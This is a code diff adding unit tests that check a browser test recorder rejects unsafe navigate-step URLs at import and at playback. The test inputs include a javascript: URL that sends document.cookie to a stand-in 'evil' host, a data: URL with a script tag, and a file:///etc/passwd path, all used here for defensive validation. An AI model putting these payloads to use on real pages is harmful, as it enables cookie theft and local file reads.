@@ -1,4 +1,4 @@
-import { validateImportedTests } from '../recordingManager';
+import { validateImportedTests, isSafeNavigateUrl, buildPlaybackScript } from '../recordingManager';
 
 function validFile(tests: unknown[] = []) {
   return { testerBrowserTests: 1, tests };
@@ -138,5 +138,42 @@ describe('validateImportedTests (#274)', () => {
   it('returns an empty result for an empty tests array', () => {
     const result = validateImportedTests(validFile([]));
     expect(result).toEqual({ tests: [], skipped: [] });
+  });
+
+  // L6: a navigate step's URL is assigned to location.href on playback.
+  it.each([
+    "javascript:fetch('//evil/?'+document.cookie)",
+    '  JavaScript:alert(1)',
+    'data:text/html,<script>alert(1)</script>',
+    'file:///etc/passwd',
+    'not a url',
+  ])('skips a test whose navigate step URL is %p', (url) => {
+    const result = validateImportedTests(validFile([{ name: 'evil', steps: [{ type: 'navigate', url }] }]));
+    expect(result.tests).toEqual([]);
+    expect(result.skipped).toEqual([{ index: 0, reason: 'navigate step URL must be http(s)' }]);
+  });
+});
+
+describe('isSafeNavigateUrl / buildPlaybackScript navigate (L6)', () => {
+  it('allows http(s) and an absent/empty URL, rejects everything else', () => {
+    expect(isSafeNavigateUrl('https://example.com/a')).toBe(true);
+    expect(isSafeNavigateUrl('http://localhost:3000/')).toBe(true);
+    expect(isSafeNavigateUrl(undefined)).toBe(true);
+    expect(isSafeNavigateUrl('')).toBe(true);
+    expect(isSafeNavigateUrl('javascript:alert(1)')).toBe(false);
+    expect(isSafeNavigateUrl('data:text/html,x')).toBe(false);
+    expect(isSafeNavigateUrl(42)).toBe(false);
+  });
+
+  it('never emits location.href for a javascript: URL at playback', () => {
+    const script = buildPlaybackScript({ id: '1', type: 'navigate', url: 'javascript:alert(document.cookie)' });
+    expect(script).not.toContain('location.href');
+    expect(script).not.toContain('document.cookie');
+    expect(script).toContain('success:false');
+  });
+
+  it('still navigates to an http(s) URL at playback', () => {
+    const script = buildPlaybackScript({ id: '1', type: 'navigate', url: 'https://example.com/' });
+    expect(script).toContain('location.href="https://example.com/"');
   });
 });
